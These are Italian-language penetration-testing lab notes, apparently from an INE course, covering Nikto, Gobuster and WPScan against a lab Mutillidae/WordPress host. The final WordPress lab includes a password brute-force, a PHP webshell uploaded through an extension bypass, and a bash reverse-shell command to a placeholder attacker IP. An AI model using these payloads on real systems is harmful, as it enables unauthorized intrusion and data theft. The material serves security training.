In questo laboratorio utilizzeremo Nikto per enumerare un server web e identificare vulnerabilità critiche come la Local File Inclusion (LFI).

#### Fase 1: Ricognizione Iniziale

* Step 1: Accedi alla macchina Kali tramite il link del laboratorio.
*   Step 2: Esegui una scansione Nmap per identificare le porte aperte:

    `nmap demo.ine.local`

    * _Risultato_: Le porte 80 (HTTP) e 3306 (MySQL) sono aperte.
* Step 3: Apri Firefox e naviga su `http://demo.ine.local`. Verificherai che sulla porta 80 è in esecuzione un'istanza di Mutillidae.

#### Fase 2: Configurazione e Scansione Generale

* Step 4: Utilizzo di Nikto per la scansione dell'applicazione.
  * Visualizza l'aiuto rapido: `nikto`
  * Visualizza l'aiuto esteso: `nikto -Help`
  *   Lancia la scansione sull'host target:

      **`nikto -h demo.ine.local`**

Informazioni chiave ottenute:

* Server: Apache 2.4.7 su Ubuntu.
* Tecnologia: PHP 5.5.9.
* Note: Nikto evidenzierà header mancanti, directory sensibili e versioni del software.

#### Fase 3: Identificazione Vulnerabilità LFI

* Step 5: Scansione specifica per Local File Inclusion (LFI).
  1. Naviga nel sito Mutillidae: _OWASP 2017 > A5: Broken Access Control > Insecure Direct Object References > Local File Inclusion_.
  2. Copia l'URL della pagina: `http://demo.ine.local/index.php?page=arbitrary-file-inclusion.php`.
  3.  Esegui Nikto in modalità Verbose focalizzandoti sui file remoti (Tuning 5):

      `nikto -h http://demo.ine.local/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -Display V`

      * _Risultato_: Nikto elencherà tutte le richieste con codice 200 OK; una di queste confermerà la vulnerabilità LFI.

#### Fase 4: Generazione Report e Verifica

*   Salvataggio Report: Genera un file HTML per analizzare meglio i risultati:

    `nikto -h http://demo.ine.local/index.php?page=arbitrary-file-inclusion.php -Tuning 5 -o nikto.html -Format htm`
*   Analisi: Apri il file generato con Firefox:

    `firefox file:///root/nikto.html`
* Verifica (PoC): Nel report HTML, clicca sull'URL evidenziato relativo al File Traversal per visualizzare direttamente il contenuto del file `/etc/passwd` del server target.

#### 📊 Riassunto Opzioni Nikto (Quick Ref)

| **Opzione**   | **Descrizione**                                             |
| ------------- | ----------------------------------------------------------- |
| `-h`          | Specifica l'host target o l'URL completo.                   |
| `-Tuning 5`   | Focalizza lo scan su Remote File Retrieval (LFI/Traversal). |
| `-Display V`  | Modalità Verbose: mostra tutte le richieste inviate.        |
| `-o [file]`   | Specifica il nome del file di output.                       |
| `-Format htm` | Specifica il formato del report (html).                     |

Conclusione: Nikto non solo ha identificato la tecnologia del server, ma ha trovato il punto esatto di iniezione per leggere file di sistema, fornendo anche il link diretto per la verifica dell'attacco.

### File & Directory Brute-Force

Il brute-forcing (o Content Discovery) è il processo utilizzato per individuare risorse che non sono collegate direttamente all'applicazione web e che non sono destinate alla visibilità pubblica.

#### Perché cercare risorse "nascoste"?

Spesso sul server rimangono tracce o file che gli sviluppatori hanno dimenticato o non hanno protetto adeguatamente, tra cui:

* Pannelli di amministrazione: Pagine di gestione interna.
* File di configurazione: Documenti contenenti parametri critici o credenziali.
* File di backup: Copie di sicurezza (es. `.bak`, `.old`, `.zip`) che possono rivelare il codice sorgente.
* Ambienti di sviluppo: Risorse di test o staging rimaste online per errore.

#### Meccanismo di Funzionamento

Il processo si basa sull'invio sistematico di richieste HTTP al server web:

1. Si carica una Wordlist (una lista di nomi comuni di file e directory).
2. Il tool invia una richiesta per ogni voce della lista.
3. In base alla risposta del server (es. codice 200 OK), il tool identifica se la risorsa è presente.

#### 🚀 Gobuster

Gobuster è un tool di enumerazione scritto in Go, scelto per la sua velocità e l'efficienza nella gestione dei thread.

#### Modalità Operative

* `dir`: Per la scoperta di directory e file (la modalità principale per questo task).
* `dns`: Per l'individuazione di sottodomini.
* `vhost`: Per identificare host virtuali sullo stesso indirizzo IP.

#### Parametri e Flag Fondamentali

* `-u`: Specifica l'URL del target.
* `-w`: Percorso del file wordlist.
* `-x`: Estensioni dei file da cercare (es. `.php`, `.xml`, `.txt`).
* `-b`: Blacklist dei codici di stato HTTP per filtrare i risultati (es. escludere 404).
* `-r`: Abilita la scansione ricorsiva (analizza anche le sottocartelle trovate).
* `-k`: Ignora la verifica dei certificati SSL.

#### 🛠️ Comandi Pratici

#### 1. Scansione Directory Semplice

Esegue un brute-force di base utilizzando una wordlist comune: `gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt`

#### 2. Filtraggio dei Risultati

Per pulire l'output ed escludere i codici di errore (4xx) o i redirect (301) che possono generare confusione:

```
gobuster dir -u http://demo.ine.local -w [WORDLIST] -b 403,404
```

#### 3. Ricerca Avanzata (Estensioni e Ricorsione)

Per individuare file specifici e scansionare automaticamente le profondità del sito:

```
gobuster dir -u http://demo.ine.local -w [WORDLIST] -b 403,404 -x .php,.xml,.txt -r
```

#### 4. Analisi di una Directory Specifica

Per concentrare l'attacco su una sottocartella già individuata (es. `/data`):

```
gobuster dir -u http://demo.ine.local/data -w [WORDLIST] -b 403,404 -x .php,.xml,.txt -r
```

### Directory Enumeration with Gobuster (Lab)

L'obiettivo di questo laboratorio è utilizzare Gobuster per scoprire file e directory nascoste, arrivando a esfiltrare credenziali sensibili.

#### Fase 1: Ricognizione e Setup

* Step 1: Accedi alla macchina Kali tramite il link fornito.
*   Step 2: Esegui Nmap per individuare i servizi attivi:

    `nmap demo.ine.local`

    * _Risultato_: Porte 80 (HTTP) e 3306 (MySQL) aperte.
* Step 3: Naviga su `http://demo.ine.local` con Firefox. Verificherai la presenza di un'istanza di Mutillidae.

#### Fase 2: Configurazione di Gobuster

* Step 4: Esplora le opzioni del tool nel terminale:
  * `gobuster`: Mostra le modalità generali (dir, dns, vhost).
  * `gobuster dir --help`: Mostra i parametri specifici per la ricerca di directory.

#### Fase 3: Scansione Progressiva

* Step 5 (Scansione Base): Avvia il brute-force specificando URL (`-u`) e wordlist (`-w`):

```
gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt
```

* Step 6 (Filtraggio): Escludi i codici di errore (403 Forbidden e 404 Not Found) per pulire l'output usando il flag `-b`:

```
gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt -b 403,404
```

#### Fase 4: Ricerca Avanzata e Ricorsione

* Step 7 (Estensioni e Redirect): Cerca file con estensioni specifiche (`-x`) e segui i redirect (`-r`):

```
gobuster dir -u http://demo.ine.local -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
```

* Step 8 (Targeting Specifico): Focalizza la scansione sulla directory `/data` individuata in precedenza:

```
gobuster dir -u http://demo.ine.local/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r
```

* _Risultato critico_: Identificato il file accounts.xml all'interno della cartella `/data`.

#### Fase 5: Esfiltrazione Dati

*   Step 9: Accedi al file tramite browser per visualizzarne il contenuto:

    URL: `http://demo.ine.local/data/accounts.xml`

Esito: Il file rivela credenziali di accesso in chiaro (username e password), confermando l'importanza del content discovery per trovare dati sensibili dimenticati sul server.

#### 📝 Riepilogo Flag Gobuster Utilizzati

| **Flag** | **Funzione**                                                    |
| -------- | --------------------------------------------------------------- |
| `-u`     | Specifica l'URL del target.                                     |
| `-w`     | Indica il percorso della wordlist.                              |
| `-b`     | Blacklist: ignora i codici di stato specificati (es. 403, 404). |
| `-x`     | Cerca file con estensioni specifiche (es. .xml, .php).          |
| `-r`     | Segue i redirect (codici 301/302).                              |

### Introduction to CMS Security Testing

Un CMS (Content Management System) è un'applicazione software che permette agli utenti di creare, gestire e modificare contenuti su un sito web senza necessità di conoscenze tecniche specializzate.

#### Cos'è un CMS?

Un CMS facilita la gestione dei contenuti digitali e, sebbene offra grandi vantaggi in termini di usabilità, introduce superfici di attacco specifiche che devono essere testate durante un engagement di pentesting.

#### I CMS più comuni

I sistemi di gestione contenuti più diffusi includono:

* WordPress: Il più popolare al mondo.
* Joomla: Noto per la sua flessibilità.
* Drupal: Spesso utilizzato per siti complessi e aziendali.

#### Perché testare la sicurezza dei CMS?

I CMS sono bersagli frequenti per gli attaccanti a causa della loro popolarità e della presenza di componenti di terze parti. Le aree critiche da analizzare sono:

1. Vulnerabilità del Core: Difetti nel codice principale del CMS stesso.
2. Plugin e Temi: Spesso sviluppati da terze parti, rappresentano l'anello debole della catena e sono la fonte principale di vulnerabilità.
3. Configurazioni errate: Credenziali di default, permessi sui file non corretti o interfacce di amministrazione esposte.
4. Software obsoleto: Mancata applicazione delle patch di sicurezza per il core o per le estensioni.

#### Obiettivi del Security Testing su CMS

Durante un test di sicurezza, l'obiettivo è identificare:

* Versioni vulnerabili: Identificare con precisione la versione del CMS e dei plugin installati.
* Utenti validi: Effettuare l'enumerazione degli utenti per tentare attacchi di forza bruta.
* Pagine di amministrazione: Individuare i punti di accesso ai pannelli di controllo (es. `/wp-admin`, `/administrator`).
* Vulnerabilità note: Cercare exploit pubblici relativi ai componenti identificati.

#### 🛠️ Strumenti di Analisi (Overview)

Per automatizzare e rendere efficiente il test, si utilizzano tool specifici per ogni piattaforma:

* WPScan: Per WordPress.
* JoomScan: Per Joomla.
* Droopescan: Per Drupal e SilverStripe.

### Introduction to WordPress Security Testing

WordPress è il CMS più diffuso al mondo, il che lo rende un bersaglio primario per gli attaccanti. Il testing di sicurezza si concentra sull'identificazione di componenti vulnerabili e configurazioni errate.

#### 🛡️ Aree di Attacco Principali

* Core di WordPress: Vulnerabilità nel codice base del CMS.
* Plugin e Temi: Rappresentano la maggiore superficie di attacco. Spesso contengono codice non sicuro o non aggiornato.
* Database: Il cuore dei contenuti e delle credenziali (solitamente MySQL/MariaDB).
* File di Configurazione: File critici come `wp-config.php` che contengono le credenziali del DB.

#### 🔍 Fase di Enumerazione

Prima dell'attacco vero e proprio, è fondamentale raccogliere informazioni:

1. Versione di WordPress: Identificabile tramite i meta tag nell'HTML o file come `readme.html`.
2. Plugin e Temi installati: Ricerca di directory in `/wp-content/plugins/` e `/wp-content/themes/`.
3. Enumerazione Utenti: Identificazione degli username validi per successivi attacchi di forza bruta.

#### ⚡ Exploitation e Post-Exploitation

**1. Exploitation: Accesso al Sistema**

L'obiettivo principale è ottenere l'accesso non autorizzato.

* Bypass del Login: Si tentano tecniche per scavalcare la form di autenticazione (es. SQL Injection o sfruttando vulnerabilità in plugin di autenticazione) per ottenere l'accesso amministrativo senza credenziali valide.
* Brute Force: Attacco sistematico contro la pagina `wp-login.php` una volta ottenuti gli username.

**2. Exfiltration: Estrazione Dati Sensibili**

Una volta compromesso il sito o il server, si procede con l'esfiltrazione:

* Database Dump: Esportazione dell'intero database WordPress per ottenere hash delle password, indirizzi email e contenuti privati.
* File di Sistema: Download di file sensibili come `wp-config.php` (per ottenere le chiavi di cifratura e credenziali DB) o file presenti nella root del server (es. `.htaccess`, file di log).

#### 🛠️ Tool di Riferimento: WPScan

WPScan è lo scanner di vulnerabilità standard per WordPress.

* Funzionalità:
  * Rilevamento della versione.
  * Controllo della presenza di vulnerabilità note (CVE).
  * Enumerazione di utenti, temi e plugin vulnerabili.
  * Attacchi di forza bruta sulle password.

## Exploiting WordPress

#### **1. Enumerazione e Identificazione**

Prima di utilizzare strumenti specifici per il CMS, si effettua una ricognizione generale del server web per confermare la presenza di WordPress e identificare la tecnologia sottostante.

* Nmap: Utilizzato per scoprire porte aperte e versioni dei servizi.

```
sudo nmap -Pn -sS -sV -T4 demo.ine.local
```

* Nikto: Scanner generico per web server che può identificare directory standard di WordPress e vulnerabilità di configurazione.

```
nikto -h http://demo.ine.local
```

#### **2. Scansione Mirata con WPScan**

WPScan è lo strumento principale per l'analisi di sicurezza di WordPress. Permette di identificare versioni vulnerabili di core, plugin e temi.

* **Scansione Base**:

```
wpscan --url http://demo.ine.local
```

* **Enumerazione Utenti**: Fondamentale per identificare account validi tramite il brute-force degli ID degli autori.

```
wpscan --url http://demo.ine.local -eu
```

* **Password Brute Force**: Una volta ottenuto un username (es. _admin_), si tenta di indovinare la password usando una wordlist.

```
wpscan --url http://demo.ine.local -U admin -P /root/Desktop/wordlists/100-common-passwords.txt
```

**3. Post-Exploitation**

Dopo aver ottenuto l'accesso al pannello di amministrazione di WordPress (es. tramite credenziali compromesse), l'obiettivo si sposta sul controllo del server:

* Obiettivo: Elevare i privilegi dall'applicazione web al sistema operativo.
* Webshell: Caricamento di uno script (spesso tramite l'editor dei temi o il caricamento di un plugin malevolo) per eseguire comandi direttamente sulla macchina o sul web server.

### Exploiting WordPress (Lab)

### Dall'Accesso Admin alla Reverse Shell

In questo scenario, non ci limitiamo a compromettere l'account `admin`, ma sfruttiamo una vulnerabilità in un plugin per eseguire codice remoto (RCE) e ottenere una shell sul server.

#### Fase 1: Dictionary Attack (Burp Intruder)

Dopo aver intercettato una richiesta di login (`wp-login.php`), utilizziamo Intruder per testare una wordlist di password.

* **Targeting**: Impostiamo il payload sulla variabile della password nel corpo della richiesta POST.
* **Identificazione**: Il successo è indicato da un codice di stato **302 Redirec**t (che reindirizza a `/wp-admin/`) e una lunghezza (**Length**) della risposta differente rispetto ai tentativi falliti.
  * _Password trovata_: `lawrence`.

#### Fase 2: Exploitation del Plugin Vulnerabile

Una volta loggati, l'analisi dei plugin rivela WordPress Responsive Thumbnail Slider v1.0.

1. **Ricerca Exploit:** Tramite Google/Exploit-DB si identifica una vulnerabilità di Arbitrary File Upload.
2. **Preparazione Webshell:** Creiamo un file PHP minimale: `<?php system($_GET["cmd"]) ?>`
3. **Bypass dei Controlli:**
   * Salviamo il file come `shell.php.jpg` per ingannare i controlli lato client.
   * Intercettiamo l'upload con Burp Suite.
   * In Burp Repeater, rinominiamo il file nel corpo della richiesta rimuovendo l'estensione `.jpg` e lasciando solo `.php`.

#### Fase 3: Esecuzione Comandi (Webshell)

Verifichiamo il caricamento navigando all'URL del file caricato (solitamente in `/wp-content/uploads/...`).

* Test: Aggiungiamo il parametro `?cmd=id` all'URL. Se il server risponde con l'ID dell'utente (es. `www-data`), abbiamo l'esecuzione remota dei comandi.

#### Fase 4: Reverse Shell e Privilegi

Per una gestione più comoda, passiamo dalla webshell a una shell interattiva.

1. **Listener**: Sulla macchina Kali, avviamo un listener: `nc -lvp 54321`.
2. **Payload**: Utilizziamo una _reverse shell in Bash_.
   * _Comando_: `bash -i >& /dev/tcp/[IP_KALI]/54321 0>&1`.
   * Importante: Il payload deve essere URL-encoded (tramite Burp Decoder) prima di essere inviato tramite il parametro `?cmd=`.
3. Connessione: Ricevuta la shell, possiamo esplorare il file system.

#### Fase 5: Final Flag Retrieval

Utilizziamo i permessi ottenuti per cercare file sensibili (che contengono la stringa "flag"):

* **`find / -iname *flag* 2>/dev/null`**
* Leggiamo il file trovato per completare la sfida.

#### 💡 Analisi Tecnica: Perché ha funzionato?

L'attacco ha avuto successo grazie a una catena di debolezze:

1. Credenziali Deboli: Permettono l'accesso iniziale tramite brute-force.
2. Mancanza di Sanificazione: Il plugin non verifica correttamente il tipo di file sul server (MIME-type vs estensione), permettendo l'upload di script eseguibili.
3. Configurazione Permissiva: Il server web permette l'esecuzione di script PHP nella cartella degli upload.
